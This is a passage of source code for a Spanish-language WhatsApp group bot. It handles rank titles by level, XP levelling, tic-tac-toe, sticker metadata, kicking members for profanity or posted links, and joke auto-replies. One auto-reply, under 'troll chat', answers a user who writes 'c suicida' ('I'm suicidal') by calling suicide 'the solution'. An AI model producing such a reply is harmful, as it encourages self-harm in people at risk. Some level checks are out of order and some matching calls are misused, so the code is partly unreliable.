            role = 'General ︾'
        } else if (levelRole <= 94) {
            role = 'General ︾︾'
        } else if (levelRole <= 96) {
            role = 'General ︾︾︾'
        } else if (levelRole <= 99) {
            role = '*FELICIDADES CRACK*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 100) {
            role = 'Lider De Alto Mando •'
        } else if (levelRole <= 102) {
            role = 'Lider De Alto Mando ••'
        } else if (levelRole <= 104) {
            role = 'Lider De Alto Mando ⊙'
        } else if (levelRole <= 106) {
            role = 'Lider De Alto Mando ⊚'
        } else if (levelRole <= 108) {
            role = 'Lider De Alto Mando ⊛'
        } else if (levelRole <= 111) {
            role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 112) {
            role = 'Retirado Con Honores'
        } else if (levelRole <= 115) {
            role = '*FELICIDADES MASTER*\n_Estas apunto de pasar a nuevos niveled sigue asi!!!_ ⇑'
        } else if (levelRole <= 116) {
            role = 'Heroe Bronce ☆'
        } else if (levelRole <= 118) {
            role = 'Heroe Plata ☆'
        } else if (levelRole <= 120) {
            role = 'Heroe Oro ☆'
        } else if (levelRole <= 122) {
            role = 'Heroe Diamante ☆'
        } else if (levelRole <= 123) {
            role = '*FELICIDADES MASTER*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
        } else if (levelRole <= 124) {
            role = 'Leyenda ✩'
        } else if (levelRole <= 125) {
            role = 'Leyenda ✩✩'
        } else if (levelRole <= 126) {
            role = 'Leyenda ✩✩✩'
        } else if (levelRole <= 127) {
            role = 'Leyenda ✩✩✩✩'
        } else if (levelRole <= 128) {
            role = 'Leyenda ✩✩✩✩✩'
        } else if (levelRole <= 129) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 130) {
            role = 'Angel ✬'
        } else if (levelRole <= 132) {
            role = 'Angel ✬✬'
        } else if (levelRole <= 134) {
            role = 'Angel ✬✬✬'
        } else if (levelRole <= 145) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 136) {
            role = 'Principado ✯'
        } else if (levelRole <= 138) {
            role = 'Principado ✯✯'
        } else if (levelRole <= 140) {
            role = 'Principado ✯✯✯'
        } else if (levelRole <= 141) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 142) {
            role = 'Potestad ✪'
        } else if (levelRole <= 144) {
            role = 'Potestad ✪✪'
        } else if (levelRole <= 146) {
            role = 'Potestad ✪✪✪'
        } else if (levelRole <= 147) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 148) {
            role = 'Grigori ♧'
        } else if (levelRole <= 152) {
            role = 'Grigori ♧♧'
        } else if (levelRole <= 154) {
            role = 'Grigori ♧♧♧'
        } else if (levelRole <= 155) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 156) {
            role = 'Paladin ♤'
        } else if (levelRole <= 158) {
            role = 'Paladin ♤♤'
        } else if (levelRole <= 160) {
            role = 'Paladin ♤♤♤'
        } else if (levelRole <= 161) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 162) {
            role = 'Regente Tipo 1'
        } else if (levelRole <= 164) {
            role = 'Regente Tipo 2'
        } else if (levelRole <= 166) {
            role = 'Regente Tipo 3'
        } else if (levelRole <= 168) {
            role = 'Regente Tipo 4'
        } else if (levelRole <= 170) {
            role = 'Regente Tipo 5'
        } else if (levelRole <= 171) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 172) {
            role = 'Arcangel •'
        } else if (levelRole <= 174) {
            role = 'Arcangel ○'
        } else if (levelRole <= 176) {
            role = 'Arcangel ●'
        } else if (levelRole <= 178) {
            role = 'Arcangel □'
        } else if (levelRole <= 180) {
            role = 'Arcangel ■'
        } else if (levelRole <= 181) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 182) {
            role = 'Guardia Celestial Tipo 1'
        } else if (levelRole <= 184) {
            role = 'Guardia Celestial Tipo 2'
        } else if (levelRole <= 186) {
            role = 'Guardia Celestial Tipo 3'
        } else if (levelRole <= 188) {
            role = 'Guardia Celestial Tipo 4'
        } else if (levelRole <= 190) {
            role = 'Guardia Celestial Tipo 5'
        } else if (levelRole <= 191) {
            role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
        } else if (levelRole <= 192) {
            role = 'Ascension Divina Proceso 1.0...'
        } else if (levelRole <= 194) {
            role = 'Ascension Divina Proceso 2.0...'
        } else if (levelRole <= 196) {
            role = 'Ascension Divina Proceso 3.0...'
        } else if (levelRole <= 198) {
            role = 'Ascension Divina Proceso 4.0...'
        } else if (levelRole <= 200) {
            role = 'Ascension Divina Proceso 5.0...'
        } else if (levelRole <= 209) {
            role = 'Ascendiendo A Poderes Divinos ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 210) {
            role = 'Entidad Menor Tipo I'
        } else if (levelRole <= 220) {
            role = 'Entidad Menor Tipo II'
        } else if (levelRole <= 230) {
            role = 'Entidad Menor Tipo III'
        } else if (levelRole <= 240) {
            role = 'Entidad Menor Tipo IV'
        } else if (levelRole <= 250) {
            role = 'Entidad Menor Tipo V'
        } else if (levelRole <= 259) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 260) {
            role = 'Entidad Mayor Tipo I'
        } else if (levelRole <= 270) {
            role = 'Entidad Mayor Tipo II'
        } else if (levelRole <= 280) {
            role = 'Entidad Mayor Tipo III'
        } else if (levelRole <= 290) {
            role = 'Entidad Mayor Tipo IV'
        } else if (levelRole <= 300) {
            role = 'Entidad Mayor Tipo V'
        } else if (levelRole <= 309) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 310) {
            role = 'Semi-Dios ◇'
        } else if (levelRole <= 320) {
            role = 'Semi-Dios ◇◇'
        } else if (levelRole <= 330) {
            role = 'Semi-Dios ◇◇◇'
        } else if (levelRole <= 340) {
            role = 'Semi-Dios ◇◇◇◇'
        } else if (levelRole <= 349) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 350) {
            role = 'Forjador De Mundos •'
        } else if (levelRole <= 360) {
            role = 'Forjador De Mundos ▪︎'
        } else if (levelRole <= 370) {
            role = 'Forjador De Mundos ○'
        } else if (levelRole <= 380) {
            role = 'Forjador De Mundos ●'
        } else if (levelRole <= 390) {
            role = 'Forjador De Mundos □'
        } else if (levelRole <= 400) {
            role = 'Forjador De Mundos ■'
        } else if (levelRole <= 410) {
            role = 'Forjador De Mundos ♡'
        } else if (levelRole <= 419) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 420) {
            role = 'Dios Nivel 0'
        } else if (levelRole <= 430) {
            role = 'Dios Nivel 1'
        } else if (levelRole <= 440) {
            role = 'Dios Nivel 2'
        } else if (levelRole <= 450) {
            role = 'Dios Nivel 3'
        } else if (levelRole <= 460) {
            role = 'Dios Nivel 4'
        } else if (levelRole <= 470) {
            role = 'Dios Nivel 5'
        } else if (levelRole <= 480) {
            role = 'Dios Nivel 8'
        } else if (levelRole <= 490) {
            role = 'Dios Nivel 10'
        } else if (levelRole <= 499) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 500) {
            role = 'Señor de Panteón Tipo-I'
        } else if (levelRole <= 600) {
            role = 'Señor de Panteón Tipo-II'
        } else if (levelRole <= 700) {
            role = 'Señor de Panteón Tipo-III'
        } else if (levelRole <= 799) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 800) {
            role = 'Juez Del Destino Faze Intermedia'
        } else if (levelRole <= 900) {
            role = 'Juez Del Destino Faze Avanzada'
        } else if (levelRole <= 999) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 1000) {
            role = 'Control De La Materia Fase 1'
        } else if (levelRole <= 2000) {
            role = 'Control De La Materia Fase 2'
        } else if (levelRole <= 3000) {
            role = 'Control De La Materia Fase 3'
        } else if (levelRole <= 4000) {
            role = 'Control De La Materia Fase 4'
        } else if (levelRole <= 5000) {
            role = 'Control De La Materia Fase 5'
        } else if (levelRole <= 5999) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 6000) {
            role = 'Controlador Del Universo\nFase 1'
        } else if (levelRole <= 7000) {
            role = 'Controlador Del Universo\nFase 2'
        } else if (levelRole <= 8000) {
            role = 'Controlador Del Universo\nFase 3'
        } else if (levelRole <= 8999) {
            role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
        } else if (levelRole <= 9000) {
            role = 'EN ASCENSO A UN PODER INIMAGINABLE...'
        } else if (levelRole <= 10000) {
            role = '*Control Del Todo Absoluto-Por encima de Dios*\n\nEn este nivel el usuario devera ganarse administracion en el grupo en el cual fue mas activo :3'
			}
//========================UwU========================//
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green', 'silver', 'gold', 'cyan', 'teal', 'magenta', 'pink', 'orange', 'lime']
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
        const isViewOnce = (type === 'viewOnceMessage')
//========================UwU========================//
			const checkLimit = (sender) => {
                let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            limitCounts = limitt - lmt.limit
                            found = true
                        }}
                    if (found === false) {
                        let obj = { id: sender, limit: 1 }
                        _limit.push(obj)
                        fs.writeFileSync('./basededatos/json/limit.json', JSON.stringify(_limit))
                        teslagod.sendMessage(from, limitcount(limitCounts), text, { quoted : mek})
                    }}
//========================UwU========================//
            if (isGroup && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 10000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await reply(`「 ⚡ACTUALIZACION DE NIVEL⚡  」\n\n➸ *Nombre*: ${pushname}\n➸ *XP*: ${getLevelingXp(sender)}\n➸ *Nivel*: ${getLevel} -> ${getLevelingLevel(sender)}\n➸ *De acuerdo a tu XP pasas a ser*: ${role}`)
                }
            } catch (err) {
                console.error(err)
            }
        }
//================console=====================//
/*--------------------[ Tictactoe Game Function ]--------------------*/
const cmde = budy.toLowerCase().split(" ")[0] || "";
if (isBaneado) return
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
     if (fs.existsSync(`./libreria/tictactoe/db/${from}.json`)) {
          const boardnow = setGame(`${from}`);
          if (budy == "Cex") return reply("por qué");
          if (
               budy.toLowerCase() == "s" ||
               budy.toLowerCase() == "si" ||
               budy.toLowerCase() == "sip"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`*[ ! ] Ya hay un juego en curso [ ! ]*`);
                    const matrix = boardnow._matrix;
                    boardnow.status = true;
                    fs.writeFileSync(
                         `./libreria/tictactoe/db/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const chatAccept = `*# ~TRES EN RAYA~ #*
                    
*Jugador ❌:* _@${boardnow.X}_

*Jugador ⭕:* _@${boardnow.O}_
          
*Es tu turno:* _@${boardnow.turn == "X" ? boardnow.X : boardnow.O}_


     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


*Sexy El Que Lo Lea 7w7 *`;
                    teslagod.sendMessage(from, chatAccept, MessageType.text, {
                         quoted: estadouwur1,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [
                                   boardnow.X + "@s.whatsapp.net",
                                   boardnow.O + "@s.whatsapp.net",
                              ],
                         },
                    });
               } else {
                    teslagod.sendMessage(
                         from,
                         `Esta opción es solo para @${boardnow.O} !`,
                         MessageType.text, {
                         quoted: estadouwur1,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          } else if (
               budy.toLowerCase() == "n" ||
               budy.toLowerCase() == "no" ||
               budy.toLowerCase() == "nop"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`*[ ! ] Ya hay un juego en curso [ ! ]*`);
                    fs.unlinkSync(`./libreria/tictactoe/db/${from}.json`);
                    teslagod.sendMessage(
                         from,
                         `_Shale el participante @${boardnow.O} ha rechazado el desafío_ u.u`,
                         MessageType.text, {
                         quoted: estadouwur1,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               } else {
                    teslagod.sendMessage(
                         from,
                         `Esta opción esta solo disponile para *@${boardnow.O}* !`,
                         MessageType.text, {
                         quoted: estadouwur1,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          }
     }

     if (arrNum.includes(cmde)) {
        const boardnow = setGame(`${from}`);
        if (!boardnow.status) return reply(`*~No se aceptó el desafío~*`)
        if (
             (boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
             sender.replace("@s.whatsapp.net", "")
        )
             return;
        const moving = validmove(Number(budy), `${from}`);
        const matrix = moving._matrix;
        if (moving.isWin) {
             if (moving.winner == "SERI") {
                  const chatEqual = `*# ~TRES EN RAYA~ #*

*Empate, nadies gana >~<*`;
                  reply(chatEqual);
                  fs.unlinkSync(`./libreria/tictactoe/db/${from}.json`);
                  return;
             }
             const winnerJID = moving.winner == "O" ? moving.O : moving.X;
             const looseJID = moving.winner == "O" ? moving.X : moving.O;
             const limWin = Math.floor(Math.random() * 20) + 10;
             const limLoose = Math.floor(Math.random() * 10) + 5;
             const chatWon = `*# ~TRES EN RAYA~ #*
        
*Felicidades _@${winnerJID}_ eres el ganador nwn*
`;
          //    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
          //    pushLimit(looseJID + "@s.whatsapp.net", limLoose);
             teslagod.sendMessage(from, chatWon, MessageType.text, {
                  quoted: estadouwur1,sendEphemeral: true,
                  contextInfo: {
                       mentionedJid: [
                            moving.winner == "O" ?
                                 moving.O + "@s.whatsapp.net" :
                                 moving.X + "@s.whatsapp.net",
                       ],
                  },
             });
             fs.unlinkSync(`./libreria/tictactoe/db/${from}.json`);
        } else {
             const chatMove = `*# ~TRES EN RAYA~ #*
        
*Jugador ❌:* _@${moving.X}_

*Jugador ⭕:* _@${moving.O}_

*Es tu turno:* _@${moving.turn == "X" ? moving.X : moving.O}_


   ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
   ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
   ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


*Sexy El Que Lo Lea 7w7 *`;
             teslagod.sendMessage(from, chatMove, MessageType.text, {
                  quoted: estadouwur1,sendEphemeral: true,
                  contextInfo: {
                       mentionedJid: [
                            moving.X + "@s.whatsapp.net",
                            moving.O + "@s.whatsapp.net",
                       ],
                  },
             });
        }
   }
//Limite en un grupo de whatsapp para que se quede xd                       
                        if (isGroup) {
				try {
					const getmemex = groupMembers.length	
					    if (getmemex <= memberLimit) {
						reply(`Hmmm...`)
						setTimeout( () => {
 	                           teslagod.groupLeave(from) 
 					   	}, 3500)
								setTimeout( () => {
								teslagod.updatePresence(from, Presence.composing)
								reply(`Pedir soporte o ayuda a wa.me/${ownerNumber1}`)
							}, 2500)
								setTimeout( () => {
								teslagod.updatePresence(from, Presence.composing)
								reply(` *Lo ciento, minimo de miembros requeridos en el grupo deve ser :* ${memberLimit}`)
							}, 0)
					    }
		       } catch (err) { console.error(err)  }
 	       }
//================console=====================//
        if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEJECUTANDO\x1b[1;37m]', time, color(command), 'de', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECIVIDO\x1b[1;37m]', time, color('mensaje'), 'de', color(sender.split('@')[0]), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEJECUTANDO\x1b[1;37m]', time, color(command), 'de', color(sender.split('@')[0]), 'Grupo', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECIVIDO\x1b[1;37m]', time, color('mensaje'), 'de', color(sender.split('@')[0]), 'Grupo', color(groupName), 'args :', color(args.length))
//========================UwU========================//
			let authorname = teslagod.contacts[from] != undefined ? teslagod.contacts[from].vname || teslagod.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }
			function addMetadata(packname, author) {
				if (!packname) packname = 'Otakus Tecnologicos'; if (!author) author = 'Matt M';
				author = author.replace(/[^a-zA-Z0-9]/g, '');
				let name = `${author}_${packname}`

				if (fs.existsSync(`./multimedia/misstks/${name}.exif`)) {
					return `./multimedia/misstks/${name}.exif`
				}
				const json = {
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}

				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

				let len = JSON.stringify(json).length
				let last

				if (len > 256) {
					len = len - 256
					bytes.unshift(0x01)
				} else {
					bytes.unshift(0x00)
				}

				if (len < 16) {
					last = len.toString(16)
					last = "0" + len
				} else {
					last = len.toString(16)
				}

				const buf2 = Buffer.from(last, "hex")
				const buf3 = Buffer.from(bytes)
				const buf4 = Buffer.from(JSON.stringify(json))

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

				fs.writeFile(`./multimedia/misstks/${name}.exif`, buffer, (err) => {
					return `./multimedia/misstks/${name}.exif`
				}
			)
		}
//========================UwU========================//
function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
    // whatsapp profie o status san\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await teslagod.setStatus(`[ NK-BOT En Linea ${uptime} ]`).catch((_) => _);
      settingstatus = new Date() * 1;
/*await teslagod.setStatus(`Sexy Kien Lea Esto 😳🙏🥵`).catch((_) => _);
      settingstatus = new Date() * 1;*/
    }
//========================UwU========================//
//Respeto en grupos UvU
if (automensajesxd.includes("mierda")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('No use esas palabras porfavor u.u')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
	
	if (automensajesxd.includes("pene")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('Por favor no use esas palabras')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
	
	if (automensajesxd.includes("vagina")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('Por favor no use esas palabras')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
	
	if (automensajesxd.includes("carajo")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('Por favor sea respetuoso')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
	
	if (automensajesxd.includes("culo")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('Por favor sea respetuoso')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
	
	if (automensajesxd.includes("imbecil")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('Por favor sea respetuoso con los demas')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso con los demas ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
	
	if (automensajesxd.includes("estupido")){
		if (!isGroup) return
		if (!isBadWord) return
		if (isGroupAdmins) return reply('Por favor sea respetuoso con los demas')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Sea respetuoso con los demas ${sender.split("@")[0]} `)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("F")
		}, 4000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			teslagod.updatePresence(from, Presence.composing)
			reply("5 segundos")
		}, 0)
	}
//AutoBot :v
       if (isGroup && isAntiLink && !autonomo) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return
        teslagod.groupRemove(from, [sender]);
      }
    }
////antilink forzado xd
		if (budy.includes("https://")){
					if (!isGroup) return
					if (!isAntiLinkuwu) return
					if (isGroupAdmins && !autonomo) return reply(`[ ! ] Este usuario no puede ser eliminado`)
					teslagod.updatePresence(from, Presence.composing)
					var kic = `${sender.split("@")[0]}@s.whatsapp.net`
						reply(`*-.-*`)
						setTimeout( () => {
						teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		} 
		
		if (budy.includes("http://")){
		if (!isGroup) return
		if (!isAntiLinkuwu) return
		if (isGroupAdmins && !autonomo) return reply('[ ! ] Este usuario no puede ser eliminado')
		teslagod.updatePresence(from, Presence.composing)
		if (automensajesxd.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*-.-*`)
		setTimeout( () => {
			teslagod.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
	}
		
//rpts interactivas
if (automensajesxd.includes(("antitraba"),("Antitraba"))){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(kuakerzzz())
	}
if (automensajesxd.includes(("destraba"),("Destraba"))){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(kuakerzzz())
	}
if (automensajesxd.includes(("antitrava"),("Antitrava"))){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(kuakerzzz())
	}
if (automensajesxd.includes(("destrava"),("Destrava"))){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(kuakerzzz())
	}
//troll chat
if (budy.includes("c suicida")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*El suicidio no es una opcion* 😞🤙`)
			setTimeout( () => {
				reply(`_*Es la solución*_ 😎🤝`)
				}, 1000)
	}
if (budy.includes("zzz")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*Tienes sueño o anemia?*\n_*Ve al medico y notaras la diferencia ;)*_ `)
	}
if (budy.includes("impostor")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*AmongUs*`)
	}
if (budy.includes("ctm")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*Cuida-Tu-Mundo*`)
	}
if (budy.includes("lptm")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*La-Paja-Te-Mata*`)
	}
//especial bot
